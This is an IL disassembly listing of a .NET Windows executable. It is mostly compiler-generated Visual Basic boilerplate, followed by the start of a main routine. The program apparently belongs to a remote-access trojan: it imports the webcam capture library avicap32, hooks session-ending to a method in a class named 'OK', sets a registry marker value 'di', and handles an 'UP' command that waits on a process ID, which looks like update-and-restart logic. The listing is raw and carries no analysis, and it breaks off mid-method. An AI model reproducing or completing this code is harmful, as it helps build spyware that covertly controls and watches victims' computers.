
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.0.30319.1
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32.dll
.module extern user32
.module extern psapi
.module extern avicap32.dll
.module extern kernel32
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly ClassLibrary1
{

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module ClassLibrary1.exe
// MVID: {8CFFB9EF-088B-4BB5-9B6A-C4E5225F0C31}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x002E0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init (bool V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  ldarg.1
      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0008:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0010

      IL_0010:  ldloc.0
      IL_0011:  ret
    } // end of method MyWebServices::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init (int32 V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  1
      .locals init (class [mscorlib]System.Type V_0)
      IL_0000:  nop
      IL_0001:  ldtoken    My.MyProject/MyWebServices
      IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000b:  stloc.0
      IL_000c:  br.s       IL_000e

      IL_000e:  ldloc.0
      IL_000f:  ret
    } // end of method MyWebServices::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance string [mscorlib]System.Object::ToString()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       32 (0x20)
      .maxstack  2
      .locals init (!!T V_0,
               bool V_1)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  box        !!T
      IL_0007:  ldnull
      IL_0008:  ceq
      IL_000a:  stloc.1
      IL_000b:  ldloc.1
      IL_000c:  brfalse.s  IL_0018

      IL_000e:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_0013:  stloc.0
      IL_0014:  br.s       IL_001e

      IL_0016:  br.s       IL_001d

      IL_0018:  nop
      IL_0019:  ldarg.0
      IL_001a:  stloc.0
      IL_001b:  br.s       IL_001e

      IL_001d:  nop
      IL_001e:  ldloc.0
      IL_001f:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init (!!T V_0)
      IL_0000:  nop
      IL_0001:  ldarg.1
      IL_0002:  ldloca.s   V_0
      IL_0004:  initobj    !!T
      IL_000a:  ldloc.0
      IL_000b:  stobj      !!T
      IL_0010:  nop
      IL_0011:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       38 (0x26)
      .maxstack  2
      .locals init (!T V_0,
               bool V_1)
      IL_0000:  nop
      IL_0001:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0006:  box        !T
      IL_000b:  ldnull
      IL_000c:  ceq
      IL_000e:  stloc.1
      IL_000f:  ldloc.1
      IL_0010:  brfalse.s  IL_001c

      IL_0012:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0017:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001c:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0021:  stloc.0
      IL_0022:  br.s       IL_0024

      IL_0024:  ldloc.0
      IL_0025:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       42 (0x2a)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  nop
    IL_0029:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyComputer V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyApplication V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyProject/MyWebServices V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi ClassLibrary1.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::.ctor

  .method private static void  _Lambda__4(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void ClassLibrary1.OK::ED()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::_Lambda__4

  .method public static void  main() cil managed noinlining nooptimization
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       1240 (0x4d8)
    .maxstack  5
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             int32 V_1,
             string V_2,
             string[] V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [System]System.Diagnostics.Process V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             bool V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Threading.Thread V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             class [mscorlib]System.Exception V_19,
             class [mscorlib]System.Exception V_20,
             string V_21,
             class [mscorlib]System.Exception V_22,
             class [mscorlib]System.Exception V_23,
             class [mscorlib]System.Exception V_24,
             class [mscorlib]System.Exception V_25,
             class [mscorlib]System.Exception V_26,
             class [mscorlib]System.Exception V_27,
             string V_28,
             bool V_29,
             bool V_30)
    IL_0000:  nop
    IL_0001:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0006:  brfalse.s  IL_0015

    IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_000d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0012:  ldc.i4.0
    IL_0013:  bgt.s      IL_0018

    IL_0015:  ldc.i4.0
    IL_0016:  br.s       IL_0019

    IL_0018:  ldc.i4.1
    IL_0019:  stloc.s    V_29
    IL_001b:  ldloc.s    V_29
    IL_001d:  brfalse    IL_0157

    IL_0022:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0027:  ldstr      ":"
    IL_002c:  ldc.i4.m1
    IL_002d:  ldc.i4.0
    IL_002e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0033:  stloc.3
    IL_0034:  nop
    IL_0035:  ldloc.3
    IL_0036:  ldc.i4.0
    IL_0037:  ldelem.ref
    IL_0038:  stloc.s    V_28
    IL_003a:  nop
    IL_003b:  ldloc.s    V_28
    IL_003d:  ldstr      "UP"
    IL_0042:  ldc.i4.0
    IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0048:  ldc.i4.0
    IL_0049:  ceq
    IL_004b:  stloc.s    V_29
    IL_004d:  ldloc.s    V_29
    IL_004f:  brfalse    IL_0130

    IL_0054:  nop
    IL_0055:  nop
    .try
    {
      IL_0056:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_005b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0060:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0065:  ldstr      "di"
      IL_006a:  ldstr      "!"
      IL_006f:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0074:  nop
      IL_0075:  leave.s    IL_0099

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0077:  dup
      IL_0078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_007d:  stloc.s    V_5
      IL_007f:  nop
      IL_0080:  ldloc.s    V_5
      IL_0082:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0087:  nop
      IL_0088:  ldloc.s    V_5
      IL_008a:  stloc.s    V_4
      IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0091:  nop
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0097:  leave.s    IL_0099

    }  // end handler
    IL_0099:  nop
    IL_009a:  nop
    .try
    {
      IL_009b:  ldloc.3
      IL_009c:  ldc.i4.1
      IL_009d:  ldelem.ref
      IL_009e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00a3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_00a8:  stloc.s    V_6
      IL_00aa:  ldloc.s    V_6
      IL_00ac:  ldc.i4     0x1388
      IL_00b1:  callvirt   instance bool [System]System.Diagnostics.Process::WaitForExit(int32)
      IL_00b6:  pop
      IL_00b7:  nop
      .try
      {
        IL_00b8:  ldloc.s    V_6
        IL_00ba:  callvirt   instance void [System]System.ComponentModel.Component::Dispose()
        IL_00bf:  nop
        IL_00c0:  nop
        IL_00c1:  leave      IL_0156

        IL_00c6:  leave.s    IL_00f2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00c8:  dup
        IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ce:  stloc.s    V_7
        IL_00d0:  nop
        IL_00d1:  ldloc.s    V_7
        IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00d8:  nop
        IL_00d9:  ldloc.s    V_7
        IL_00db:  stloc.s    V_8
        IL_00dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00e2:  nop
        IL_00e3:  nop
        IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00e9:  leave.s    IL_0156

        IL_00eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f0:  leave.s    IL_00f2

      }  // end handler
      IL_00f2:  nop
      IL_00f3:  leave.s    IL_012a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f5:  dup
      IL_00f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fb:  stloc.s    V_9
      IL_00fd:  nop
      IL_00fe:  ldloc.s    V_9
      IL_0100:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0105:  nop
      IL_0106:  ldloc.s    V_9
      IL_0108:  stloc.s    V_10
      IL_010a:  ldc.i4     0x1388
      IL_010f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0114:  nop
      IL_0115:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011a:  nop
      IL_011b:  nop
      IL_011c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0121:  leave.s    IL_0156

      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0128:  leave.s    IL_012a

    }  // end handler
    IL_012a:  nop
    IL_012b:  nop
    IL_012c:  br.s       IL_0156

    IL_012e:  br.s       IL_0156

    IL_0130:  nop
    IL_0131:  ldloc.s    V_28
    IL_0133:  ldstr      ".."
    IL_0138:  ldc.i4.0
    IL_0139:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_013e:  ldc.i4.0
    IL_013f:  ceq
    IL_0141:  stloc.s    V_29
    IL_0143:  ldloc.s    V_29
    IL_0145:  brfalse.s  IL_0156

    IL_0147:  nop
    IL_0148:  ldc.i4     0x1388
